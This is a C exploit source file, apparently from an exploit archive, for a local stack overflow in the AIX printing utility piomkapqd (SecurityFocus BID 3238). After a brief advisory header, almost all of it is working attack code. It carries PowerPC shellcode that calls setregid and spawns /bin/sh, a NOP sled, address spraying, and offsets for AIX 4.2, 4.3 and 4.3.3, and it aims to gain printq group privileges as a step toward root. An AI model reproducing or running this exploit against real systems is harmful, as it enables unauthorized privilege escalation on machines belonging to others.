// source: https://www.securityfocus.com/bid/3238/info
//
// The 'piomkapqd' utility is a component of the AIX printing subsystem. By default, it is installed setgid and owned by the 'printk' group.
//
// 'piomkapqd' contains a locally exploitable stack overrun condition in it's handling of command line parameters.
//
// Local users may be able to gain group 'printk' privileges if this vulnerability is exploited. It may be possible to elevate to root from this point by exploiting vulnerabilities in other components of the printing subsystem.

/*## copyright LAST STAGE OF DELIRIUM sep 2000 poland        *://lsd-pl.net/ #*/
/*## /usr/lib/lpd/pio/etc/piomkapqd                                          #*/

/*   note: to avoid potential system hang-up please, first obtain the exact   */
/*   AIX OS level with the use of the uname -a or oslevel commands            */

/*   this code gives privilages of a printq group. from that point euid=root  */
/*   can be gained with the use of our aix_piodmgrsu or aix_digest codes      */

#define ADRNUM 2000
#define NOPNUM 16000

#define PRINTQ_GID 9

char setregidcode[]=
    "\x7e\x94\xa2\x79"     /* xor.    r20,r20,r20            */
    "\x40\x82\xff\xfd"     /* bnel    (setregidcode)         */
    "\x7e\xa8\x02\xa6"     /* mflr    r21                    */
    "\x3a\xb5\x01\x40"     /* cal     r21,0x140(r21)         */
    "\x88\x55\xfe\xe4"     /* lbz     r2,-284(r21)           */
    "\x88\x75\xfe\xe7"     /* lbz     r3,-281(r21)           */
    "\x88\x95\xfe\xe6"     /* lbz     r4,-282(r21)           */
    "\x3a\xd5\xfe\xe8"     /* cal     r22,-280(r21)          */
    "\x7e\xc8\x03\xa6"     /* mtlr    r22                    */
    "\x4c\xc6\x33\x42"     /* crorc   cr6,cr6,cr6            */
    "\x44\xff\xff\x02"     /* svca                           */
    "\xff\xff\xff\x01"
    "\x38\x75\xff\x08"     /* cal     r3,-248(r21)           */
    "\x38\x95\xff\x10"     /* cal     r4,-240(r21)           */
    "\x7e\x85\xa3\x78"     /* mr      r5,r20                 */
    "\x90\x75\xff\x10"     /* st      r3,-240(r21)           */
    "\x92\x95\xff\x14"     /* st      r20,-236(r21)          */
    "\x88\x55\xfe\xe5"     /* lbz     r2,-283(r21)           */
    "\x9a\x95\xff\x0f"     /* stb     r20,-241(r21)          */
    "\x4b\xff\xff\xd8"     /* bl      (setregidcode+32)      */
    "/bin/sh"
;

char nop[]="\x7f\xff\xfb\x78";

main(int argc,char **argv,char **e){
    char buffer[20000],adr[4],*b,*envp[2];
    int i;

    printf("copyright LAST STAGE OF DELIRIUM sep 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/lpd/pio/etc/piomkapqd for aix 4.2 4.3 PowerPC/POWER\n\n");

    if(argc<2){
        printf("usage: %s 42|43|433\n",argv[0]);exit(-1);
    }

    switch(atoi(argv[1])){
    case  42: memcpy(&setregidcode[44],"\xd2\x02",2); break;
    case  43: memcpy(&setregidcode[44],"\xe7\x04",2); break;
    case 433: memcpy(&setregidcode[44],"\x82\x03",2); break;
    default: exit(-1);
    }
    setregidcode[46]=PRINTQ_GID;

    i=0; while(*e++) i+=strlen(*e)+1;
    *((unsigned long*)adr)=(unsigned long)e+(i&~3)-8000;

    envp[0]=&buffer[3000];
    envp[1]=0;

    b=buffer;
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    b=&buffer[3000];
    sprintf(b,"xxx=");b+=4;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(setregidcode);i++) *b++=setregidcode[i];
    *b=0;

    execle("/usr/lib/lpd/pio/etc/piomkapqd","lsd","-p",buffer,0,envp);
}